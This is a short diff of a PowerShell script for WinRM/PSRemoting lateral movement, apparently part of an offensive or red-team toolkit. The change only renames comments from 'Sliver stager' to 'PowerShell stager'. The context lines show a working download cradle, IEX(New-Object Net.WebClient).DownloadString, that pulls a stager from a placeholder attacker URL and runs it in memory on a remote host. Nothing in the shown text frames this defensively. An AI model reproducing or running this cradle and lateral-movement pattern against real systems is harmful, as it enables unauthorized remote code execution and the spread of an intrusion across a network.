@@ -1,6 +1,6 @@
 # =============================================================================
 # WinRM / PSRemoting lateral movement
-# Runs a command (Sliver stager) on a remote host over WinRM.
+# Runs a command (PowerShell stager) on a remote host over WinRM.
 #
 # Requirements: WinRM enabled on the target (or admin creds to enable it):
 #   Enable-PSRemoting -Force
@@ -16,7 +16,7 @@ param(
     [Parameter(Mandatory = $false)][string]$StagerUrl = "http://<IP>/run.ps1"
 )
 
-# ── Build the Sliver stager cradle ──────────────────────────────────────────
+# ── Build the stager cradle ──────────────────────────────────────────────────
 # The remote command downloads and runs your PowerShell stager in memory.
 $cmd = "IEX(New-Object Net.WebClient).DownloadString('$StagerUrl')"
 
